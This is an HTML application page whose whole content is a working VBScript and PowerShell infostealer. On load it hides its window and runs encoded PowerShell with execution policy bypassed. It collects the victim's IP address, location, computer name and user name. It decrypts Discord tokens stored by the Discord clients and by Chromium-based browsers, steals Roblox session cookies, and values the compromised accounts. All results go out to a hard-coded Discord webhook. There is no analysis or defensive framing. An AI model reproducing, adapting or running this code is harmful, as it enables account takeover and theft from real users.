<html>
<head><title>.</title>
<script language="VBScript">
On Error Resume Next

Dim sh, fso, WH, PC, USER
Set sh  = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
WH   = "https://discord.com/api/webhooks/1561899372134924359/gOeNA944tg1wj9CV8ujkN4SR6sptB1M5b3hG8Qv41uLKCwbfYrgd_8rDoym67-bW9p_G"
PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

Function B64EncodePS(s)
    Dim i, hexStr
    hexStr = ""
    For i = 1 To Len(s)
        Dim lo : lo = Asc(Mid(s, i, 1))
        hexStr = hexStr & Right("0" & Hex(lo), 2) & "00"
    Next
    Dim doc  : Set doc  = CreateObject("MSXML2.DOMDocument.6.0")
    Dim nHex : Set nHex = doc.createElement("h")
    nHex.DataType = "bin.hex"
    nHex.Text = hexStr
    Dim nB64 : Set nB64 = doc.createElement("b")
    nB64.DataType = "bin.base64"
    nB64.nodeTypedValue = nHex.nodeTypedValue
    Dim result : result = nB64.Text
    result = Replace(result, Chr(10), "")
    result = Replace(result, Chr(13), "")
    result = Replace(result, " ", "")
    B64EncodePS = result
    Set nHex = Nothing : Set nB64 = Nothing : Set doc = Nothing
End Function

Function RunPS(code)
    Dim enc : enc = B64EncodePS(code)
    sh.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand " & enc, 0, True
End Function

Function RunPSAsync(code)
    Dim enc : enc = B64EncodePS(code)
    sh.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand " & enc, 0, False
End Function

Function RunPSCapture(code)
    Dim regKey : regKey = "HKCU\Software\Microsoft\InputMethod\Results"
    Dim regVal : regVal = "CacheData_" & CStr(Int(Timer * 1000))

    Dim wrapped : wrapped = _
        "$rp = 'HKCU:\Software\Microsoft\InputMethod\Results';" & _
        "if (-not (Test-Path $rp)) { New-Item -Path $rp -Force | Out-Null };" & _
        "$out = (" & code & " | Out-String).Trim();" & _
        "if (-not $out) { $out = 'NOT_FOUND' };" & _
        "Set-ItemProperty -Path $rp -Name '" & regVal & "' -Value $out -Force"

    Dim enc : enc = B64EncodePS(wrapped)
    sh.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand " & enc, 0, True

    On Error Resume Next
    Dim result : result = sh.RegRead(regKey & "\" & regVal)
    sh.Run "powershell -NoP -NonI -W Hidden -Command ""Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\InputMethod\Results' -Name '" & regVal & "' -EA SilentlyContinue""", 0, False
    On Error GoTo 0
    RunPSCapture = result
End Function

Sub Window_OnLoad()
    window.resizeTo 0, 0
    window.moveTo -2000, -2000
    IP()
    GrabDiscord()
    GrabRoblox()
End Sub

Sub IP()
    Dim xh, ip, ll, info
    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False : xh.Send
    If xh.Status <> 200 Then Exit Sub
    ip = Trim(xh.responseText)
    If Len(ip) < 7 Then Exit Sub
    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False : xh.Send
    If xh.Status <> 200 Then Exit Sub
    ll   = Split(xh.responseText, vbLf)
    info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | USER: " & USER
    PostEmbed "Target", info, 3447003
    Set xh = Nothing
End Sub

Sub GrabDiscord()
    Dim psCode

    psCode = _
        "Add-Type -AssemblyName System.Security" & vbLf & _
        "$gcmOK = $false" & vbLf & _
        "try { $null = [System.Security.Cryptography.AesGcm]; $gcmOK = $true } catch {}" & vbLf & _
        "$tokens = New-Object System.Collections.Generic.List[string]" & vbLf & _
        "$seen   = New-Object System.Collections.Generic.HashSet[string]" & vbLf & _
        "" & vbLf & _
        "function Get-MK($base) {" & vbLf & _
        "    try {" & vbLf & _
        "        $ls = Join-Path $base 'Local State'" & vbLf & _
        "        if (-not (Test-Path $ls)) { return $null }" & vbLf & _
        "        $j  = [System.IO.File]::ReadAllText($ls) | ConvertFrom-Json" & vbLf & _
        "        $ek = [Convert]::FromBase64String($j.os_crypt.encrypted_key)" & vbLf & _
        "        return [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]$ek[5..($ek.Length-1)], $null, 'CurrentUser')" & vbLf & _
        "    } catch { return $null }" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "function Dec-GCM($mk, $b) {" & vbLf & _
        "    if (-not $gcmOK -or $null -eq $mk -or $b.Length -lt 31) { return $null }" & vbLf & _
        "    try {" & vbLf & _
        "        $nonce = [byte[]]$b[3..14]" & vbLf & _
        "        $tag   = [byte[]]$b[($b.Length-16)..($b.Length-1)]" & vbLf & _
        "        $ct    = [byte[]]$b[15..($b.Length-17)]" & vbLf & _
        "        $out   = New-Object byte[] $ct.Length" & vbLf & _
        "        $gcm   = [System.Security.Cryptography.AesGcm]::new([byte[]]$mk)" & vbLf & _
        "        $gcm.Decrypt($nonce, $ct, $tag, $out)" & vbLf & _
        "        $gcm.Dispose()" & vbLf & _
        "        return [System.Text.Encoding]::UTF8.GetString($out)" & vbLf & _
        "    } catch { return $null }" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "function Valid-Token($t) {" & vbLf & _
        "    if (-not $t) { return $false }" & vbLf & _
        "    if ($t -match '^mfa\.[\w-]{84}$') { return $true }" & vbLf & _
        "    if ($t -match '^[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}$') { return $true }" & vbLf & _
        "    return $false" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "function Check-Token($t) {" & vbLf & _
        "    try {" & vbLf & _
        "        $wc = New-Object System.Net.WebClient" & vbLf & _
        "        $wc.Headers.Add('Authorization', $t)" & vbLf & _
        "        $wc.Headers.Add('Content-Type', 'application/json')" & vbLf & _
        "        $r = $wc.DownloadString('https://discord.com/api/v9/users/@me')" & vbLf & _
        "        $wc.Dispose()" & vbLf & _
        "        return $r -match '""id""'" & vbLf & _
        "    } catch { return $false }" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "function Scan-File($path, $mk) {" & vbLf & _
        "    try {" & vbLf & _
        "        $bytes = [System.IO.File]::ReadAllBytes($path)" & vbLf & _
        "        $txt   = [System.Text.Encoding]::GetEncoding(28591).GetString($bytes)" & vbLf & _
        "        $rx1   = [regex]'dQw4w9WgXcQ:[A-Za-z0-9+/]{10,}={0,2}'" & vbLf & _
        "        foreach ($m in $rx1.Matches($txt)) {" & vbLf & _
        "            try {" & vbLf & _
        "                $enc = [Convert]::FromBase64String($m.Value.Substring(12))" & vbLf & _
        "                $dec = Dec-GCM $mk $enc" & vbLf & _
        "                if ((Valid-Token $dec) -and (Check-Token $dec) -and $seen.Add($dec)) { $tokens.Add($dec) }" & vbLf & _
        "            } catch {}" & vbLf & _
        "        }" & vbLf & _
        "        $rx2 = [regex]'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}'" & vbLf & _
        "        foreach ($m in $rx2.Matches($txt)) {" & vbLf & _
        "            if ((Valid-Token $m.Value) -and (Check-Token $m.Value) -and $seen.Add($m.Value)) { $tokens.Add($m.Value) }" & vbLf & _
        "        }" & vbLf & _
        "        $rx3 = [regex]'mfa\.[\w-]{84}'" & vbLf & _
        "        foreach ($m in $rx3.Matches($txt)) {" & vbLf & _
        "            if ((Valid-Token $m.Value) -and (Check-Token $m.Value) -and $seen.Add($m.Value)) { $tokens.Add($m.Value) }" & vbLf & _
        "        }" & vbLf & _
        "    } catch {}" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "function Scan-Dir($ldb, $mk) {" & vbLf & _
        "    if (-not (Test-Path $ldb)) { return }" & vbLf & _
        "    $files = Get-ChildItem $ldb -File -EA SilentlyContinue |" & vbLf & _
        "             Where-Object { $_.Extension -in '.ldb','.log' } |" & vbLf & _
        "             Sort-Object LastWriteTime -Descending" & vbLf & _
        "    foreach ($file in $files) { Scan-File $file.FullName $mk }" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "foreach ($app in @('discord','discordcanary','discordptb','discorddevelopment')) {" & vbLf & _
        "    $base = Join-Path $env:APPDATA $app" & vbLf & _
        "    if (-not (Test-Path $base)) { continue }" & vbLf & _
        "    $mk = Get-MK $base" & vbLf & _
        "    Scan-Dir (Join-Path $base 'Local Storage\leveldb') $mk" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "foreach ($br in @(" & vbLf & _
        "    (Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data')," & vbLf & _
        "    (Join-Path $env:LOCALAPPDATA 'Google\Chrome SxS\User Data')," & vbLf & _
        "    (Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data')," & vbLf & _
        "    (Join-Path $env:LOCALAPPDATA 'BraveSoftware\Brave-Browser\User Data')," & vbLf & _
        "    (Join-Path $env:LOCALAPPDATA 'Opera Software\Opera Stable')," & vbLf & _
        "    (Join-Path $env:LOCALAPPDATA 'Opera Software\Opera GX Stable')," & vbLf & _
        "    (Join-Path $env:LOCALAPPDATA 'Vivaldi\User Data')," & vbLf & _
        "    (Join-Path $env:LOCALAPPDATA 'Yandex\YandexBrowser\User Data')," & vbLf & _
        "    (Join-Path $env:LOCALAPPDATA 'Chromium\User Data')" & vbLf & _
        ")) {" & vbLf & _
        "    if (-not (Test-Path $br)) { continue }" & vbLf & _
        "    $mk    = Get-MK $br" & vbLf & _
        "    $profs = @('Default') + @(Get-ChildItem $br -Directory -Filter 'Profile *' -EA SilentlyContinue | Select-Object -ExpandProperty Name)" & vbLf & _
        "    foreach ($p in $profs) {" & vbLf & _
        "        Scan-Dir (Join-Path $br ""$p\Local Storage\leveldb"") $mk" & vbLf & _
        "    }" & vbLf & _
        "}" & vbLf & _
        "if ($tokens.Count -gt 0) { $tokens -join [Environment]::NewLine } else { 'NOT_FOUND' }"

    Dim raw : raw = Trim(RunPSCapture(psCode))
    If raw = "NOT_FOUND" Or Len(raw) < 10 Then Exit Sub

    Dim dcLines, dcLine, dcIdx
    dcLines = Split(raw, vbLf)
    dcIdx = 0
    For Each dcLine In dcLines
        dcLine = Trim(dcLine)
        If Len(dcLine) > 10 Then
            dcIdx = dcIdx + 1
            PostFile "discord_token_" & dcIdx & ".txt", dcLine
        End If
    Next
End Sub

Sub GrabRoblox()
    Dim psCode

    psCode = _
        "Add-Type -AssemblyName System.Security" & vbLf & _
        "$cookies = New-Object System.Collections.Generic.List[string]" & vbLf & _
        "$seen    = New-Object System.Collections.Generic.HashSet[string]" & vbLf & _
        "" & vbLf & _
        "function Clean-Cookie($raw) {" & vbLf & _
        "    $c = ($raw -replace '[\r\n\t ]','').Split(';')[0]" & vbLf & _
        "    if ($c -match '\.ROBLOSECURITY=(.+)') { $c = $Matches[1] }" & vbLf & _
        "    $c = $c.Split(';')[0]" & vbLf & _
        "    $i = $c.IndexOf('_|WARNING')" & vbLf & _
        "    if ($i -gt 0) { $c = $c.Substring($i) }" & vbLf & _
        "    if ($c.Length -gt 80 -and ($c -match '_\|WARNING' -or $c -match 'ROBLOSECURITY')) { return $c }" & vbLf & _
        "    return $null" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "function Add-Cookie($raw) {" & vbLf & _
        "    $c = Clean-Cookie $raw" & vbLf & _
        "    if ($c -and $seen.Add($c)) { $cookies.Add($c) }" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "foreach ($rp in @(" & vbLf & _
        "    (Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\robloxcookies.dat')," & vbLf & _
        "    (Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\RobloxCookies.dat')," & vbLf & _
        "    (Join-Path $env:LOCALAPPDATA 'Roblox\Cookies')," & vbLf & _
        "    (Join-Path $env:APPDATA      'Roblox\LocalStorage\robloxcookies.dat')" & vbLf & _
        ")) {" & vbLf & _
        "    if (-not (Test-Path $rp)) { continue }" & vbLf & _
        "    try {" & vbLf & _
        "        $raw = [System.IO.File]::ReadAllText($rp)" & vbLf & _
        "        try {" & vbLf & _
        "            $j = $raw | ConvertFrom-Json" & vbLf & _
        "            $j.PSObject.Properties | Where-Object { $_.Value -is [string] -and $_.Value.Length -gt 80 } | ForEach-Object {" & vbLf & _
        "                try {" & vbLf & _
        "                    $ek  = [Convert]::FromBase64String($_.Value)" & vbLf & _
        "                    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($ek, $null, 'CurrentUser')" & vbLf & _
        "                    $str = [System.Text.Encoding]::UTF8.GetString($dec)" & vbLf & _
        "                    Add-Cookie $str" & vbLf & _
        "                } catch {}" & vbLf & _
        "            }" & vbLf & _
        "        } catch {}" & vbLf & _
        "        Add-Cookie $raw" & vbLf & _
        "    } catch {}" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "$pkgs = Join-Path $env:LOCALAPPDATA 'Packages'" & vbLf & _
        "if (Test-Path $pkgs) {" & vbLf & _
        "    Get-ChildItem $pkgs -Directory -EA SilentlyContinue | Where-Object { $_.Name -match 'ROBLOX' } | ForEach-Object {" & vbLf & _
        "        foreach ($fn in @('LocalState\RobloxCookies.dat','LocalState\robloxcookies.dat','LocalState\Cookies')) {" & vbLf & _
        "            $uwp = Join-Path $_.FullName $fn" & vbLf & _
        "            if (-not (Test-Path $uwp)) { continue }" & vbLf & _
        "            try { Add-Cookie ([System.IO.File]::ReadAllText($uwp)) } catch {}" & vbLf & _
        "        }" & vbLf & _
        "    }" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "Get-ChildItem $env:TEMP -File -EA SilentlyContinue | Where-Object { $_.Extension -eq '.dat' } | ForEach-Object {" & vbLf & _
        "    try {" & vbLf & _
        "        $raw = [System.IO.File]::ReadAllText($_.FullName)" & vbLf & _
        "        if ($raw -match '_\|WARNING|ROBLOSECURITY|\.ROBLOSECURITY') {" & vbLf & _
        "            Add-Cookie $raw" & vbLf & _
        "            try {" & vbLf & _
        "                $j = $raw | ConvertFrom-Json" & vbLf & _
        "                $j.PSObject.Properties | Where-Object { $_.Value -is [string] -and $_.Value.Length -gt 80 } | ForEach-Object {" & vbLf & _
        "                    try {" & vbLf & _
        "                        $ek  = [Convert]::FromBase64String($_.Value)" & vbLf & _
        "                        $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($ek, $null, 'CurrentUser')" & vbLf & _
        "                        $str = [System.Text.Encoding]::UTF8.GetString($dec)" & vbLf & _
        "                        Add-Cookie $str" & vbLf & _
        "                    } catch {}" & vbLf & _
        "                }" & vbLf & _
        "            } catch {}" & vbLf & _
        "        }" & vbLf & _
        "    } catch {}" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "if ($cookies.Count -gt 0) { $cookies -join [Environment]::NewLine } else { 'NOT_FOUND' }"

    Dim raw : raw = Trim(RunPSCapture(psCode))
    If raw = "NOT_FOUND" Or Len(raw) < 10 Then Exit Sub

    Dim rbLines, rbLine, rbIdx
    rbLines = Split(raw, vbLf)
    rbIdx = 0
    For Each rbLine In rbLines
        rbLine = Trim(rbLine)
        If Len(rbLine) > 10 Then
            rbIdx = rbIdx + 1
            PostFile "roblox_cookie_" & rbIdx & ".txt", rbLine
            GrabRobloxInfo rbLine, rbIdx
        End If
    Next
End Sub

Sub GrabRobloxInfo(cookie, idx)
    Dim xh, json, uinfo, uid, uname, robux, premium, created, ageDays, rapVal, createdDate

    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056

    xh.Open "GET", "https://www.roblox.com/mobileapi/userinfo", False
    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
    xh.Send
    If xh.Status <> 200 Then Set xh = Nothing : Exit Sub
    json = xh.responseText

    uid     = RegexFirst(json, """UserID"":(\d+)")
    uname   = RegexFirst(json, """UserName"":""([^""]+)""")
    robux   = RegexFirst(json, """RobuxBalance"":(\d+)")
    premium = RegexFirst(json, """IsPremium"":(true|false)")
    If uid = "" Then Set xh = Nothing : Exit Sub
    If robux   = "" Then robux   = "0"
    If premium = "" Then premium = "false"

    xh.Open "GET", "https://users.roblox.com/v1/users/" & uid, False
    xh.Send
    ageDays = "?"
    If xh.Status = 200 Then
        uinfo   = xh.responseText
        created = RegexFirst(uinfo, """created"":""([^T]+)")
        If created <> "" Then
            On Error Resume Next
            createdDate = CDate(created)
            If Err.Number = 0 Then ageDays = CStr(DateDiff("d", createdDate, Now()))
            On Error GoTo 0
        End If
    End If

    rapVal = "0"
    xh.Open "GET", "https://inventory.roblox.com/v1/users/" & uid & "/assets/collectibles?limit=100", False
    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
    xh.Send
    If xh.Status = 200 Then
        Dim rapJson : rapJson = xh.responseText
        Dim rapSum  : rapSum  = 0
        Dim pos     : pos     = 1
        Dim key     : key     = """recentAveragePrice"":"
        Dim p, numStr, ch
        Do
            p = InStr(pos, rapJson, key)
            If p = 0 Then Exit Do
            p = p + Len(key)
            numStr = ""
            Do While p <= Len(rapJson)
                ch = Mid(rapJson, p, 1)
                If ch >= "0" And ch <= "9" Then
                    numStr = numStr & ch
                    p = p + 1
                Else
                    Exit Do
                End If
            Loop
            If numStr <> "" Then rapSum = rapSum + CLng(numStr)
            pos = p
        Loop
        rapVal = CStr(rapSum)
    End If

    Set xh = Nothing

    Dim nl : nl = Chr(10)
    Dim embedDesc : embedDesc = ""
    embedDesc = embedDesc & "**Username** | **Age** | **PC**" & nl
    embedDesc = embedDesc & uname & " | " & ageDays & " Days | " & PC & nl & nl
    embedDesc = embedDesc & "**Robux** | **Premium** | **RAP**" & nl
    embedDesc = embedDesc & robux & " | " & premium & " | " & rapVal & nl & nl
    embedDesc = embedDesc & "**Cookie**" & nl
    embedDesc = embedDesc & "``Check attached file roblox_cookie_" & idx & ".txt``"

    PostEmbed "Roblox Hit #" & idx, embedDesc, 16711680
End Sub

Function RegexFirst(src, pattern)
    Dim rx : Set rx = CreateObject("VBScript.RegExp")
    rx.Pattern = pattern
    rx.IgnoreCase = True
    Dim m : Set m = rx.Execute(src)
    If m.Count > 0 Then
        If m(0).SubMatches.Count > 0 Then
            RegexFirst = m(0).SubMatches(0)
        Else
            RegexFirst = m(0).Value
        End If
    Else
        RegexFirst = ""
    End If
    Set rx = Nothing
End Function

Function ReadFile(p)
    Dim f : Set f = fso.OpenTextFile(p, 1) : ReadFile = f.ReadAll : f.Close : Set f = Nothing
End Function

Sub PostEmbed(t, d, c)
    Dim DQ, j, h
    DQ = Chr(34)
    j  = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

Sub PostFile(fn, ct)
    Dim DQ, b, bd, h
    DQ = Chr(34)
    b  = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
    bd = "--" & b & vbCrLf & _
         "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & _
         ct & vbCrLf & "--" & b & "--"
    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
    h.Send bd
    Set h = Nothing
End Sub

Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr,   Chr(92) & "n")
    Ej = Replace(Ej, vbLf,   Chr(92) & "n")
    Ej = Replace(Ej, vbTab,  Chr(92) & "t")
End Function
</script>
</head><body></body></html>
